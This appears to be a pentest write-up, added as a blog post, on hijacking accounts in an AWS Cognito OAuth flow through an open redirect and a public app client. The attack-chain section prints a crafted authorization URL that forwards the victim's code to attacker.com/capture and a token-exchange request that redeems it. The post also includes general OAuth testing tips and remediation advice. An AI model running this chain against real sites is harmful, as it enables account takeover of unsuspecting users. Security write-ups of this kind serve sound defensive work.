@@ -1,0 +1,144 @@
+---
+title: "Authorization Code Interception via Open Redirect in an AWS Cognito OAuth Flow"
+date: "2025-01-01"
+dateLabel: "2025"
+description: "An unvalidated post-login redirect plus a public Cognito app client combined into an account takeover that required no phishing page and no victim password."
+tags: ["OAuth 2.0", "AWS Cognito", "Open Redirect", "Account Takeover", "Token Leak"]
+---
+
+## How to Approach OAuth Security Testing
+
+OAuth vulnerabilities tend to hide in the seams between components. The identity provider, the application, and the browser each play a role in the flow, and misconfigurations at any of those handoff points can be critical. Most developers get the happy path right but leave edge cases unchecked.
+
+When you start testing an OAuth implementation, the first thing to do is map the flow by watching traffic in Burp during login. Look at what parameters are being passed in the authorization request: `response_type`, `redirect_uri`, `state`, `client_id`, and `scope`. Each of these is a test surface.
+
+Start with `redirect_uri` manipulation. Modify it to a domain you control and observe what the identity provider does. Most modern providers will reject it, but the interesting cases are when the application itself has an open redirect somewhere in the allowed callback path that can be used to forward the code onward.
+
+Then test the client type. Send a token exchange request with a garbage authorization code to the token endpoint. A confidential client will reject the request before even checking the code, because the client secret is missing or invalid. A public client will get further in the process and fail on the code itself. That distinction tells you how much protection exists around the code once it is obtained.
+
+Do not skip the state parameter. Remove it entirely and complete the login flow. If it succeeds, CSRF on login is possible. Also verify that the state is actually validated on the callback and not just echoed back to the client without comparison.
+
+After gaining access to any account, inspect every field in the user profile API response carefully. Reset tokens, API keys, internal identifiers, and session handles are frequently included in responses during development and never removed before production.
+
+## Background
+
+This post covers an account takeover I found during a web application engagement. The target used AWS Cognito as its identity provider and implemented the OAuth 2.0 Authorization Code Grant for user authentication. On the surface the setup looked standard. Cognito is a mature service and when configured correctly it handles a lot of the security guarantees automatically. The issue was not with Cognito itself but with two decisions the application team made around it: how the SSO callback handled redirects, and whether the app client required a secret.
+
+OAuth misconfigurations like this are more common than they should be. They tend to surface in applications that integrated a third-party identity provider quickly, often following the provider's quickstart documentation, which prioritizes getting authentication working over hardening every parameter. The open redirect in particular is easy to miss because it does not look dangerous in isolation. It only becomes critical when combined with the public client.
+
+## Understanding OAuth 2.0 and the Authorization Code Grant
+
+OAuth 2.0 is an authorization framework that allows applications to request limited access to user accounts on a third-party service. Instead of sharing credentials directly with the application, the user authenticates with the identity provider and the application receives a token it can use to act on the user's behalf.
+
+The Authorization Code Grant is the recommended flow for web applications. It works in two phases. First, the user is redirected to the identity provider, authenticates there, and the provider sends a short-lived authorization code back to the application via a redirect to a pre-registered callback URL. Second, the application exchanges that code server-side for the actual access and identity tokens. The code is designed to be a disposable intermediary that travels through the browser but can only be redeemed by the server that holds the client secret.
+
+<Concept>
+A **public client** is an OAuth app client that does not require a client secret for token exchange. It is intended for native apps and single-page apps where a secret cannot be kept confidential. When used for a server-side web application, it removes the main protection that makes the Authorization Code Grant safe: the requirement that only the legitimate server can exchange a code for tokens.
+</Concept>
+
+<FlowChart
+  title="OAuth Authorization Code Interception Attack Chain"
+  steps={[
+    { label: "Step 1", title: "Attacker crafts malicious link", subtitle: "redirect_uri points to attacker server", tone: "warn" },
+    { label: "Step 2", title: "Victim clicks link", subtitle: "Lands on legitimate Cognito login page", tone: "neutral" },
+    { label: "Step 3", title: "Victim authenticates normally", subtitle: "Cognito issues authorization code", tone: "neutral" },
+    { label: "Step 4", title: "Open redirect forwards code", subtitle: "sso_callback sends code to attacker", tone: "warn" },
+    { label: "Step 5", title: "Attacker exchanges code for tokens", subtitle: "Public client, no secret required", tone: "warn" },
+    { label: "Result", title: "Full account takeover", subtitle: "", tone: "critical" },
+  ]}
+/>
+
+## The Misconfiguration: Two Issues That Combined Into One Critical Finding
+
+The first issue was in how the SSO callback endpoint was implemented. After Cognito authenticated the user and issued an authorization code, it redirected the user back to the application's callback URL. The callback then read a destination parameter from the URL to decide where to send the user next. That destination was not validated against any allowlist, making it an open redirect.
+
+On its own, an open redirect in a post-login flow is low to medium severity. The user is already authenticated at that point. But here it became the mechanism that allowed the authorization code to be delivered to attacker-controlled infrastructure.
+
+The second issue was that the Cognito app client was configured as public. To confirm this I sent a token exchange request with an intentionally invalid authorization code and observed the error response. The server did not reject the request for a missing client secret. It got further in the process and failed on the code validation itself, which confirmed no secret was required.
+
+<Concept>
+An **open redirect** is a vulnerability where an application accepts an external URL as a parameter and redirects the user to it without validation. In the context of an OAuth callback, it allows the authorization code to be forwarded to any destination the attacker specifies, because the code travels in the URL during the redirect.
+</Concept>
+
+## The Attack Chain
+
+### Step 1 — Crafting the Authorization Request
+
+The authorization URL points to the legitimate Cognito hosted UI. The `redirect_uri` points to the application's real callback, which Cognito has registered. But appended to that callback is a `next` parameter pointing to attacker infrastructure. When Cognito redirects to the callback after authentication, the callback forwards the user again using that parameter, carrying the code along.
+
+```
+https://auth.target.com/oauth2/authorize
+  ?response_type=code
+  &client_id=XXXXXXXXXX
+  &redirect_uri=https://app.target.com/sso_callback
+      ?next=https://attacker.com/capture
+  &scope=openid+profile+email
+```
+
+### Step 2 — Victim Authenticates on the Real Cognito Page
+
+The victim receives this link and clicks it. They land on a completely legitimate Cognito login page at the real domain. There is no spoofing. They enter their credentials and complete any MFA required. Cognito issues a valid authorization code and redirects back to the callback.
+
+### Step 3 — Code Forwarded to Attacker Infrastructure
+
+The callback receives the code and reads the `next` parameter. Without validating the destination, it redirects the victim to the attacker's server with the code in the URL. The attacker's server logs the incoming request.
+
+```
+GET /capture?code=eyJhbGciOiJSUzI1NiJ9.XXXX&state=...
+
+# Code extracted. Victim is redirected again to look normal.
+```
+
+### Step 4 — Exchanging the Code for Tokens
+
+The attacker takes the intercepted code and sends it directly to Cognito's token endpoint. Since the client is public, no secret is required. Cognito validates the code and returns a full token set belonging to the victim.
+
+```
+POST /oauth2/token
+Content-Type: application/x-www-form-urlencoded
+
+grant_type=authorization_code
+&code=eyJhbGciOiJSUzI1NiJ9.XXXX
+&redirect_uri=https://app.target.com/sso_callback?next=https://attacker.com/capture
+&client_id=XXXXXXXXXX
+
+# Response: access_token, id_token, refresh_token for the victim's account
+```
+
+A call to `/oauth2/userInfo` confirmed the identity. Full account access without the victim's password.
+
+## Bonus Finding: Password Reset Token in the User Profile Response
+
+After gaining access to the account, I called the `/currentUser` endpoint to see what the application exposed about the authenticated user. The response included an active password reset token. It had not been requested by the victim. It was simply a field in the user object that the API returned on every profile request.
+
+<Concept>
+A **password reset token** is a temporary credential that allows a user to set a new password without knowing the current one. Exposing it in an API response means an attacker with read access to the user profile can silently reset the password, locking the legitimate owner out and maintaining access even after OAuth tokens expire or are revoked.
+</Concept>
+
+```
+{
+  "id": "usr_XXXXXX",
+  "email": "victim@target.com",
+  "passwordResetToken": "reset_XXXXXXXXXXXX",
+  "passwordResetExpiry": "2025-XX-XXT18:00:00Z"
+}
+```
+
+## Impact
+
+- Full account takeover of any user who clicked the crafted link
+- No victim interaction beyond normal authentication, no phishing page required
+- Persistent access via password reset token extraction, independent of OAuth session lifetime
+- Potential for mass compromise if the link was distributed at scale
+
+## Remediation
+
+- Remove the open redirect from `/sso_callback` and manage post-login routing through server-side session state instead of URL parameters
+- Convert the Cognito app client to confidential and require a client secret for all token exchange requests
+- Implement PKCE as an additional layer of protection, especially if a public client is required
+- Remove password reset tokens and any security-sensitive fields from user profile API responses
+- Enforce a strict allowlist for all redirect URIs registered in the Cognito app client configuration
+
+---
+
+*Vulnerability details have been generalized to protect client confidentiality. All findings were reported and remediated as part of the engagement.*
